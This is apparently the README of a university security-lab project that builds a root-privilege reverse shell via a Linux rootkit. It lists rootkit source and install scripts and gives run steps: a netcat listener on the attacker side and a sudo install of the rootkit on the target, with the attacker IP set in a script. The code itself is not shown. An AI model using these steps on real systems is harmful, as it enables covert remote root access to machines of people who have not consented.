# Securitylab Project - Root Privileges Reverse Shell

## Team Member
<b>Sittichok Thanomkulrat and Xianze Zhan

## What Does it do?

## File You May Care
- install_rootkit.sh
- reverse_shell.sh
- rootkit.c
- rootkit.h
## How to Run? <br />
On Attacker side: <br />
nc -l -p <listen_port> -vvv <br />

On target bot side: <br />

make <br />
sudo ./install_rootkit.sh <br />
You may modify the attacker server ip address & listen port in the script <br />
